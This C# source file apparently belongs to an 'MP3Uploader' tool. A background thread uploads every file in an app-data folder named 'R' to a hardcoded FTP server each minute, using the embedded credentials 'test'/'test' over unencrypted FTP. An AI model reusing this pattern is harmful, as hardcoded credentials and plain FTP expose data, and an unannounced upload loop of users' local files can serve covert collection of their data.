using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.IO;

namespace MP3Uploader
{
    class FileUploaderThread
    {
        ftp ftpClient = null;

        Boolean m_bRunning = true;
        public void setThreadFlag(Boolean flag)
        {
            m_bRunning = flag;
        }

        public void run()
        {
            ftpClient = new ftp(@"ftp://192.168.0.110/", "test", "test");
            
            String app_data_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            Console.WriteLine(app_data_path);

            String record_path = app_data_path + "\\R";
            while (m_bRunning)
            {
                try
                {
                    DateTime now = DateTime.Now;

                    string[] files = Directory.GetFiles(record_path);
                    foreach (string file in files)
                    {                        
                        String filename = Path.GetFileName(file);

                        String upload_path = now.Year + "";
                        ftpClient.createDirectory(upload_path);
                        upload_path += "/" + now.Month;
                        ftpClient.createDirectory(upload_path);
                        upload_path += "/" + now.Day;
                        ftpClient.createDirectory(upload_path);
                        upload_path += "/" + filename;

                        ftpClient.upload(upload_path, file);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }

                Thread.Sleep(60 * 1000);
            }
            ftpClient = null;
        }
    }
}
